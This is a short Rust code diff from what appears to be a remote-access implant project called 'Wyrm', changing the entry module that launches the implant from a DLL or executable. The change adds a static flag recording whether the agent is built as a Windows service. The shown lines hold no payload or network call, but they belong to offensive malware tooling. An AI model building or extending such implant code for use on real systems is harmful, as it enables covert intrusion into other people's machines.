@@ -1,6 +1,6 @@
 //! Entry module for kicking off the implant, whether from a DLL or an exe.
 
-use std::{thread::sleep, time::Duration};
+use std::{sync::atomic::AtomicBool, thread::sleep, time::Duration};
 
 #[cfg(debug_assertions)]
 use shared::pretty_print::print_failed;
@@ -11,6 +11,9 @@ use crate::{
     comms::configuration_connection,
     wyrm::{Wyrm, calculate_sleep_seconds},
 };
+
+/// Determines whether the agent is built as a service, or not
+pub static IS_IMPLANT_SVC: AtomicBool = AtomicBool::new(false);
 
 /// Literally just the entry function into the payload allowing flexibility to call from either
 /// an exe, or dll
